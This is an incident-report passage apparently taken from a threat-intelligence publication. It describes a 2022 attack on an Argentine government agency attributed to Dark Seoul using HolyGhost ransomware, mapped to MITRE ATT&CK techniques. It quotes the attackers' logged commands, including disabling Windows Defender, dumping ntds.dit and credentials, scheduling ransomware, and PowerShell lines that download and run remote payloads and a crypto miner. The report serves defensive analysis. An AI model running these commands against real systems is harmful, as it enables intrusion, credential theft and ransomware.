@@ -1,0 +1,195 @@
+Incident 5. Argentina
+Victim summary
+Contents 61
+Threat
+Dark Seoul, HolyGhost
+Industry
+Government
+Incident description
+Countries affected
+Argentina
+In April of 2022, we detected an incident related to a government agency of Argentina. Based on our analysis
+of the techniques, tactics, and tools employed by the attacker, we can assume that these actions were taken
+by the APT group known as Dark Seoul. A preliminary analysis indicated that the attackers used a privileged
+account to run various files on the system and to run a malicious file known as HolyGhost Ransomware. The
+data collected from the customer's machines allowed us to reconstruct a timeline of events and analyze this
+incident in detail. We'll examine the details below.
+Detailed description
+Exploit Public-Facing Application T1190
+The attackers gained initial access by exploiting the vulnerability CVE-2021-44228 (Log4Shell) in VMware
+Horizon.
+Valid Accounts: Domain Accounts T1078.002
+To execute commands on other machines in the network, they used a built-in local administrator account or
+privileged accounts that were compromised during the attack.
+Here is an example log for ransomware started under a privileged account (KES blocked it from running):
+Event : 5203
+Source : Real-Time File Protection
+Category : (3)
+The following information was included with the event: С:\Windows\btlc.exe
+HEUR: Trojan-Ransom.Win32.Generic
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 5. Argentina Contents 62
+System Services: Service Execution T1569.002
+The attackers created Windows services with names that are similar to legitimate services (Masquerade Task
+or Service T1036.004).
+%SystemRoot%\System32\svchost.exe -k msupdate2
+SERVICE_CREATE
+S-1-5-18 (NT AUTHORITY\SYSTEM)
+Event : 7045
+Service Name: Windows Host Management
+Service File Name: cmd /K start С:\Windows\setup\svchost.exe
+Service Type: user mode service
+Service Start Type: auto startService Account: LocalSystem
+Event : 7045
+Service Name: Windows Service Management
+Service File Name: cmd /K start С:\Windows\setup\winhost.exe
+Service Type: user mode service
+Service Start Type: auto start
+Service Account: LocalSystem
+Scheduled Task/Job: Scheduled Task T1053.005
+To run ransomware on other machines in the network, they created a scheduled task that started the malicious
+program. Command line within the ransomware:
+schtasks /create /tn lockertask /tr С:\Windows\btlc.exe /sc minute /mo 1 /F /ru system
+Here is an example log for ransomware started through the Task Scheduler:
+Source Name: Microsoft-Windows-TaskScheduler
+Strings: ['\lockertask' '{511DD224-22C0-408A-8A3D-1F80AAAABD8C}']
+Computer Name: PC_NAME
+Record Number: 136571
+Event Level: 4
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 5. Argentina Contents 63
+Figure 26
+Execution graph. TIP interface
+Account Manipulation: SSH Authorized Keys T1098.004
+Creating sessions and authorizing connections to command centers on behalf of users configured by the
+attackers.
+Obfuscated Files or Information T1027
+The malicious files that were used during exploitation of VMware Horizon were packed by Themida to conceal
+them from analysis.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 5. Argentina Contents 64
+Figure 27 Warning
+Additionally, most of the PowerShell commands used by the attackers were obfuscated:
+PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden
+-EncodedCommand JAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagB…
+Impair Defenses: Disable or Modify Tools T1562.001
+The attackers disabled Windows Defender Realtime Monitoring:
+PowerShell -exec bypass -command Get-MpPreference
+PowerShell -exec bypass -command Set-MpPreference -DisableRealtimeMonitoring $True
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 5. Argentina Contents 65
+Network Share Connection Removal T1070.005
+Prior to starting encryption of user files, the HolyGhost sample unmounted the connected network drives:
+net use * /delete /y
+OS Credential Dumping T1003
+The ProcDump tool was used to obtain account credentials from infected machines:
+Content Modification Time,REG,Registry Key__,[\Software\Sysinternals\ProcDump] EulaAccepted:
+[REG_DWORD_LE] 1__,winreg/winreg_default,OS:/data/C/Windows/System32/config/DEFAULT,
+Source: SYSTEM
+С:\Windows\temp\rar.exe
+С:\Windows\temp\socks_x64.exe
+С:\Windows\temp\plink.exe
+С:\Windows\temp\svshost.exe
+С:\Windows\temp\pd64.exe
+С:\Windows\temp\mi.exe
+С:\Windows\temp\svphost.exe
+OS Credential Dumping: NTDS T1003.003
+To access the passwords of all users in the domain, the attackers dumped of ntds.dit:
+PowerShell ntdsutil.exe 'ac i ntds' 'ifm' 'create full С:\Windows\temp\ztemp' q q
+Network Service Discovery T1046
+To detect open ports on machines in the network, the attackers used custom PowerShell scripts and ran them
+on the systems:
+& {. С:\Windows\temp\1.ps1; Invoke-PortCheck -network 10.0.48 -port 22,80,445,443,3389,8080 }
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 5. Argentina Contents 66
+They also used popular software for identifying subnets, IP addresses, services, users, shared resources, and
+other relevant information: Advanced IP Scanner, Sysinternals Tools, and others:
+C:\Users\USERNAME\appdata\local\temp\29\advanced ip scanner 2\advanced_ip_scanner.exe
+System Information Discovery T1082
+Collecting information from systems, resources, and applications.
+systeminfo
+System Network Connections Discovery T1049
+Obtaining information from network connections to identify active services.
+netstat -nato
+ipconfig /all
+nslookup MACHINE_DOMAIN_NAME
+Remote System Discovery T1018
+Searching for systems in the network
+ping DOMAIN_NAME_1 -n 2
+ping DOMAIN_NAME_2
+Remote System Discovery T1018
+To move laterally through the network, the attackers used RDP and other services to connect to Windows
+machines, and used SSH to connect to Linux servers. Compromised accounts were used for connections.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 5. Argentina Contents 67
+Example of reconnaissance on remote hosts using smbexec:
+Service Name: BTOBTO
+Service File Name: %COMSPEC% /Q /c echo route print > \127.0.0.1\C$__output 2>^&1 > %TEMP%\
+execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
+Service Type: user mode service
+Service Start Type: demand start
+Service Account: LocalSystem
+Service Name: BTOBTO
+Service File Name: %COMSPEC% /Q /c echo cd > \127.0.0.1\C$__output 2>^&1 > %TEMP%\execute.
+bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
+Service Type: user mode service
+Service Start Type: demand start
+Service Account: LocalSystem
+The PuTTY tool was used to connect over SSH.
+DEFAULT,Software\SimonTatham\PuTTY\SshHostKeys\ssh_
+SOURCE_IP@443:IP_1
+SOURCE_IP@9223:IP_2
+SOURCE_IP@22:IP_3
+SOURCE_IP@22:IP_4
+Ingress Tool Transfer T1105
+PowerShell was used to transfer tools between hosts.
+IEX ((new-object net.webclient).downloadstring('http://DOMAIN_NAME/cdyujhs.jpg'))
+(New-Object System.Net.WebClient).DownloadFile('http://DOMAIN_NAME/ugly.exe', 'С:\Windows\
+ccalc.exe');Start-Process -Filepath 'С:\Windows\ccalc.exe'
+$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile
++= '.bat'; $wc.DownloadFile('http://DOMAIN_NAMEDOMAIN_NAME/kill.bat', $tempfile); & $tempfile
+PowerShell.exe -nop -c IEX ((new-object net.webclient).downloadstring('http://DOMAIN_NAME/
+vmware/horizon/r347876.php?p=DOMAIN_NAME'))
+[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls';(New-Object Net.WebClient).
+DownloadFile('DOMAIN_NAME','C:\ProgramData\pscp.exe')
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 5. Argentina Contents 68
+Resource Hijacking T1496
+Exploitation of the vulnerability in VMware Horizon allowed the attackers to install the XMRIG cryptocurrency
+miner to a system.
+PowerShell -Command [Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = NewObject System.Net.WebClient; $wc.DownloadFile('DOMAIN_NAME', 'С:\Windows\system32\config\
+systemprofile\xmrig.zip')
+PowerShell -Command Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.
+IO.Compression.ZipFile]::ExtractToDirectory('С:\Windows\system32\config\systemprofile\xmrig.zip',
+'С:\Windows\system32\config\systemprofile\mimu6')
+Data Encrypted for Impact T1486
+HolyGhost was used to encrypt user data. This malware was written in Go and contains functions for detecting
+execution within a virtual environment, disabling user shares, and creating and deleting the service that is used
+to run this malware. HolyGhost can create scheduled tasks on machines in the network for the purpose of
+encrypting other machines. The public key used for encryption is obtained from the C2 server over HTTP.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 5. Argentina
+Contents 69
+In this incident, the attackers used port 8888, which
+is a non-standard port for HTTP (Non-Standard
+Port T1571): http://IP:8888
+Figure 28 List of functions
+Starting a service:
+User files are encrypted using the AES algorithm.
+Figure 29 Function for obtaining a key
+schtasks /create /tn lockertask /tr С:\Windows\btlc.exe /sc minute /mo 1 /F /ru system
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 5. Argentina
+Figure 30
+Instructions for decrypting files: FOR_DECRYPT.html
+All encrypted files are saved with this name format: .h0lyenc
+Summary
+Contents 70
+Aside from the fact that the APT group Dark Seoul used HolyGhost ransomware in the analyzed attack, the
+group employed standard techniques. The attackers' successful use of these techniques to achieve their goals
+may indicate that the group chooses its victims based on the level of security of their infrastructure.
+Download techniques in JSON format for MITRE Navigator:
+Learn more
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 5. Argentina
